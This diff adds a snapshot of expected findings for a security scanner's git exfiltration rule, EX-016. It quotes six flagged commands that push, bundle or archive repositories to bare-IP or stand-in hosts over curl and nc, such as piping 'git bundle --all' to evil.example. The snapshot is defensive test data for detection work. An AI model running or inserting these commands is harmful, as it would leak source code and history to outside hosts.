@@ -1,0 +1,72 @@
+---
+source: src/rules/builtin/exfiltration.rs
+expression: findings
+---
+[
+  {
+    "id": "EX-016",
+    "severity": "critical",
+    "category": "exfiltration",
+    "confidence": "firm",
+    "name": "Git remote exfiltration",
+    "line": 7,
+    "code": "git remote add exfil http://192.168.1.50/loot.git",
+    "message": "Potential git-based exfiltration: repository data is being pushed or bundled to a bare-IP or piped network destination.",
+    "recommendation": "Artifacts must not push repositories to unnamed IP endpoints or pipe git bundles/archives into curl/nc. Remove the remote and audit for leaked history."
+  },
+  {
+    "id": "EX-016",
+    "severity": "critical",
+    "category": "exfiltration",
+    "confidence": "firm",
+    "name": "Git remote exfiltration",
+    "line": 8,
+    "code": "git remote add backup git://45.9.148.3/repo.git",
+    "message": "Potential git-based exfiltration: repository data is being pushed or bundled to a bare-IP or piped network destination.",
+    "recommendation": "Artifacts must not push repositories to unnamed IP endpoints or pipe git bundles/archives into curl/nc. Remove the remote and audit for leaked history."
+  },
+  {
+    "id": "EX-016",
+    "severity": "critical",
+    "category": "exfiltration",
+    "confidence": "firm",
+    "name": "Git remote exfiltration",
+    "line": 9,
+    "code": "git push http://10.0.0.1:8080/loot HEAD",
+    "message": "Potential git-based exfiltration: repository data is being pushed or bundled to a bare-IP or piped network destination.",
+    "recommendation": "Artifacts must not push repositories to unnamed IP endpoints or pipe git bundles/archives into curl/nc. Remove the remote and audit for leaked history."
+  },
+  {
+    "id": "EX-016",
+    "severity": "critical",
+    "category": "exfiltration",
+    "confidence": "firm",
+    "name": "Git remote exfiltration",
+    "line": 10,
+    "code": "git config remote.origin.url http://45.9.148.3/x.git",
+    "message": "Potential git-based exfiltration: repository data is being pushed or bundled to a bare-IP or piped network destination.",
+    "recommendation": "Artifacts must not push repositories to unnamed IP endpoints or pipe git bundles/archives into curl/nc. Remove the remote and audit for leaked history."
+  },
+  {
+    "id": "EX-016",
+    "severity": "critical",
+    "category": "exfiltration",
+    "confidence": "firm",
+    "name": "Git remote exfiltration",
+    "line": 11,
+    "code": "git bundle create - --all | curl -X POST --data-binary @- http://evil.example",
+    "message": "Potential git-based exfiltration: repository data is being pushed or bundled to a bare-IP or piped network destination.",
+    "recommendation": "Artifacts must not push repositories to unnamed IP endpoints or pipe git bundles/archives into curl/nc. Remove the remote and audit for leaked history."
+  },
+  {
+    "id": "EX-016",
+    "severity": "critical",
+    "category": "exfiltration",
+    "confidence": "firm",
+    "name": "Git remote exfiltration",
+    "line": 12,
+    "code": "git archive --format=tar HEAD | nc 203.0.113.9 4444",
+    "message": "Potential git-based exfiltration: repository data is being pushed or bundled to a bare-IP or piped network destination.",
+    "recommendation": "Artifacts must not push repositories to unnamed IP endpoints or pipe git bundles/archives into curl/nc. Remove the remote and audit for leaked history."
+  }
+]
